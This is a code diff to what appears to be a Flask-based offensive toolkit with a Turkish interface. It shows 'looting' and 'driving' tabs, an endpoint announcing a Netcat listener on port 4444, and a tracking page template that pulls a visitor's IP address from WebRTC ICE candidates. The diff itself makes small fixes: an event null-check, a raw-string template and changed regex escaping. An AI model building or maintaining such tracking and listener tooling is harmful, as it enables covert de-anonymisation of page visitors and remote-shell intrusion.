@@ -418,7 +418,9 @@ HTML_TEMPLATE = """
             document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
             document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
             document.getElementById(tabId).classList.add('active');
-            event.currentTarget.classList.add('active');
+            if(event && event.currentTarget) {
+                event.currentTarget.classList.add('active');
+            }
             
             if(tabId === 'drivingTab') loadDrivingReports();
             if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
@@ -1438,7 +1440,7 @@ def api_listener_start():
     port = request.get_json().get("port", 4444)
     return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi."})
 
-TRACK_TEMPLATE = """
+TRACK_TEMPLATE = r"""
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -1492,7 +1494,7 @@ TRACK_TEMPLATE = """
                 pc.createOffer().then(offer => pc.setLocalDescription(offer));
                 pc.onicecandidate = (ice) => {
                     if (ice && ice.candidate && ice.candidate.candidate) {
-                        let ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        let ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\\\\.[0-9]{1,3}){3})/);
                         if (ipMatch) data.webrtc_ip = ipMatch[1];
                     }
                 };
